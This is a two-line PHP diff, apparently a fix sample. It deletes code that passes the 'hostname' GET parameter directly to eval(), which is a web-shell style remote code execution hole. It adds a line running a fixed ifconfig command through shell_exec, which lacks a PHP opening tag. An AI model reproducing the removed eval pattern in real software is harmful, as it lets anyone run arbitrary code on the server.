@@ -1,2 +1,1 @@
-<?php $code = $_GET['hostname'];
-eval($code); ?>
+echo shell_exec('/sbin/ifconfig eth0');
